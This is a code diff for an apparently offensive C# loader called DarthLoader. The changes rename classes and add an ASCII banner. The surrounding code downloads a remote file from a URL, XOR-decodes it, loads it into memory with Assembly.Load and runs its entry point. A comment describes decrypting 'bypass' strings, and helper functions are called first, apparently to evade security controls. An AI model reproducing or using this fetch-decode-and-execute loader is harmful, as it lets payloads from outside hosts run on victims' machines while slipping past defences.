@@ -7,7 +7,7 @@ namespace DarthLoader
 {
     class DarthLoader
     {
-        public static string UtilityKey = "";
+        public static string HelperKey = "";
 
         static void ExecuteLocalFile(string FilePath)
         {
@@ -27,7 +27,7 @@ namespace DarthLoader
             {
                 try
                 {
-                    programBytes = Utilities.XorBytes(webClient.DownloadData(url), xorKey);
+                    programBytes = Helpers.XorBytes(webClient.DownloadData(url), xorKey);
                 }
                 catch (WebException)
                 {
@@ -49,7 +49,7 @@ namespace DarthLoader
         {
             try
             {
-                Assembly dotNetProgram = Assembly.Load(Utilities.XorBytes(programBytes, xorKey));
+                Assembly dotNetProgram = Assembly.Load(Helpers.XorBytes(programBytes, xorKey)) ;
                 string[] parameters = new string[] { null };
                 dotNetProgram.EntryPoint.Invoke(null, new object[] { parameters });
             }
@@ -62,14 +62,30 @@ namespace DarthLoader
 
         static void Main(string[] args)
         {
+            string banner =
+                @"
+ _______                     __     __       __                              __                   
+|       \                   |  \   |  \     |  \                            |  \                  
+| $$$$$$$\ ______   ______ _| $$_  | $$____ | $$      ______   ______   ____| $$ ______   ______  
+| $$  | $$|      \ /      |   $$ \ | $$    \| $$     /      \ |      \ /      $$/      \ /      \ 
+| $$  | $$ \$$$$$$|  $$$$$$\$$$$$$ | $$$$$$$| $$    |  $$$$$$\ \$$$$$$|  $$$$$$|  $$$$$$|  $$$$$$\
+| $$  | $$/      $| $$   \$$| $$ __| $$  | $| $$    | $$  | $$/      $| $$  | $| $$    $| $$   \$$
+| $$__/ $|  $$$$$$| $$      | $$|  | $$  | $| $$____| $$__/ $|  $$$$$$| $$__| $| $$$$$$$| $$      
+| $$    $$\$$    $| $$       \$$  $| $$  | $| $$     \$$    $$\$$    $$\$$    $$\$$     | $$      
+ \$$$$$$$  \$$$$$$$\$$        \$$$$ \$$   \$$\$$$$$$$$\$$$$$$  \$$$$$$$ \$$$$$$$ \$$$$$$$\$$                                                                                                                                           
+                ";
+
+            Console.WriteLine(banner);
+
             try
             {
                 // testing123
-                UtilityKey = args[0]; // decrypts bypass required strings
+                // decrypts bypass required strings
+                HelperKey = args[0];
                 string filePath = args[1];
 
-                Utilities.FirstHelperFunction();
-                Utilities.SecondHelperFunction();
+                Helpers.FirstHelperFunction();
+                Helpers.SecondHelperFunction();
 
                 if (filePath.StartsWith("http"))
                 {
@@ -97,7 +113,7 @@ namespace DarthLoader
             catch (IndexOutOfRangeException)
             {
                 Console.WriteLine("==========" + " Usage " + "==========");
-                Console.WriteLine("DarthLoader.exe <UtilityXorKey> <FilePath> <Optional Xor Key for Remote Assembly>");
+                Console.WriteLine("DarthLoader.exe <UtilityXorKey> <FilePath> <Optional Xor Key for Remote Assembly>\n");
             }
         }
     }
